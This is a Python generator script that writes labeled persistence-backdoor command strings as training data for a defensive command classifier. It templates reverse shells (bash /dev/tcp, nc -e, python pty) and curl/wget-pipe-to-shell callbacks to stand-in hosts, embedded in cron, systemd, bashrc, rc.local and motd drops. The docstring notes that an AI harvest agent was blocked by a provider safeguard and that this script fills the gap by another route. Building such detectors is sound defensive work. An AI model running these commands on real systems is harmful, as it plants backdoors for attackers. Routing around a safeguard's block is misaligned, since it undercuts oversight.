#!/usr/bin/env python3
"""Deterministic generator for PERSISTENCE (backdoor-via-scheduled/boot-exec).

Backfills the persistence-backdoor class for the IAAC command-intent classifier
(the harvest agent for this class was blocked by a provider cyber-safeguard).
This produces COMMAND STRINGS ONLY as labeled training data for a DEFENSIVE
classifier — nothing here is executed. Covers MITRE T1053 (cron/scheduled),
T1543 (systemd service/timer), T1037/T1546 (boot/logon + profile/rc drops).

Writes dataset/seeds/per_backdoor.jsonl in the §15.0 record schema.
"""
import json, os, itertools, random

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "seeds", "per_backdoor.jsonl")
SEED = 1337
TARGET = 360

IPS = ["10.0.0.5", "10.10.14.7", "192.168.1.50", "203.0.113.7", "198.51.100.23", "172.16.0.9"]
DOMAINS = ["evil.example.com", "c2.example.net", "update.example.org", "cdn.example.io"]
PORTS = ["4444", "1337", "9001", "443", "8080", "53"]
PATHS = ["s.sh", "x", "b", "shell.sh", "beacon", "p.sh"]
UNITS = ["updater", "syslogd-helper", "dbus-monitor", "network-check", "cache-sync", "cleanup"]
USERS = ["www-data", "deploy", "postgres", "app", "svc"]
SCHED = ["* * * * *", "*/5 * * * *", "0 * * * *", "@reboot", "*/2 * * * *"]


def payloads(ip, port, dom, path):
    """Callback commands embedded inside the persistence mechanism."""
    return [
        (f"bash -i >& /dev/tcp/{ip}/{port} 0>&1", "revshell-bash"),
        (f"curl -fsSL http://{dom}/{path} | bash", "callback-curl"),
        (f"wget -qO- http://{ip}:{port}/{path} | sh", "callback-wget"),
        (f"nc {ip} {port} -e /bin/bash", "revshell-nc"),
        (f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'", "revshell-py"),
    ]


def mechanisms(pl, ip, port, dom, path, unit, user, sched):
    """(command, family_id) tuples — one per persistence technique."""
    m = []
    # --- cron / scheduled (T1053) ---
    m.append((f'(crontab -l 2>/dev/null; echo "{sched} {pl}") | crontab -', "cron-crontab-append"))
    m.append((f'echo "{sched} {pl}" | crontab -', "cron-crontab-pipe"))
    m.append((f'echo "{sched} root {pl}" > /etc/cron.d/{unit}', "cron-d-file"))
    m.append((f'echo "@reboot {user} {pl}" >> /etc/crontab', "cron-etc-reboot"))
    m.append((f'echo "{pl}" > /etc/cron.hourly/{unit} && chmod +x /etc/cron.hourly/{unit}', "cron-hourly-drop"))
    m.append((f'echo "{pl}" | at now + 1 minute', "at-job"))
    # --- systemd (T1543) ---
    m.append((f"printf '[Unit]\\n[Service]\\nExecStart=/bin/bash -c \"{pl}\"\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/systemd/system/{unit}.service && systemctl enable --now {unit}", "systemd-service-drop"))
    m.append((f"systemctl enable --now {unit}.service", "systemd-enable"))
    m.append((f"systemd-run --unit={unit} --on-calendar='*:0/5' /bin/bash -c '{pl}'", "systemd-run-timer"))
    m.append((f"printf '[Timer]\\nOnBootSec=60\\nOnUnitActiveSec=300\\n[Install]\\nWantedBy=timers.target\\n' > /etc/systemd/system/{unit}.timer && systemctl enable --now {unit}.timer", "systemd-timer-drop"))
    # --- boot / logon / profile drops (T1037/T1546) ---
    m.append((f'echo "{pl}" >> ~/.bashrc', "bashrc-drop"))
    m.append((f'echo "{pl}" >> ~/.bash_profile', "bashprofile-drop"))
    m.append((f'echo "{pl}" >> /etc/profile.d/{unit}.sh', "profiled-drop"))
    m.append((f'sed -i \'/^exit 0/i {pl}\' /etc/rc.local', "rc-local-insert"))
    m.append((f'echo "{pl}" >> /etc/rc.local', "rc-local-append"))
    m.append((f'echo -e "#!/bin/sh\\n{pl}" > /etc/update-motd.d/99-{unit} && chmod +x /etc/update-motd.d/99-{unit}', "motd-backdoor"))
    m.append((f'echo "{pl}" > ~/.config/autostart/{unit}.desktop', "xdg-autostart"))
    m.append((f'printf "[Unit]\\nDescription={unit}\\n" >> ~/.config/systemd/user/{unit}.service && systemctl --user enable {unit}', "systemd-user-drop"))
    return m


def main():
    rng = random.Random(SEED)
    rows, seen = [], set()
    combos = list(itertools.product(IPS, PORTS, DOMAINS, PATHS, UNITS, USERS, SCHED))
    rng.shuffle(combos)
    for ip, port, dom, path, unit, user, sched in combos:
        pls = payloads(ip, port, dom, path)
        rng.shuffle(pls)
        pl, pl_fam = pls[0]
        for cmd, fam in mechanisms(pl, ip, port, dom, path, unit, user, sched):
            if cmd in seen:
                continue
            seen.add(cmd)
            rows.append({
                "command": cmd,
                "expected": "PERSISTENCE",
                "source": "generated",
                "technique": None,
                "is_synthetic": True,
                "is_obfuscated": False,
                "family_id": f"persist-{fam}",
                "reviewed_by": None,
            })
            if len(rows) >= TARGET:
                break
        if len(rows) >= TARGET:
            break
    with open(OUT, "w") as fh:
        for r in rows:
            fh.write(json.dumps(r, ensure_ascii=False) + "\n")
    fams = len({r["family_id"] for r in rows})
    print(f"wrote {len(rows)} PERSISTENCE backdoor rows across {fams} families -> {OUT}")


if __name__ == "__main__":
    main()
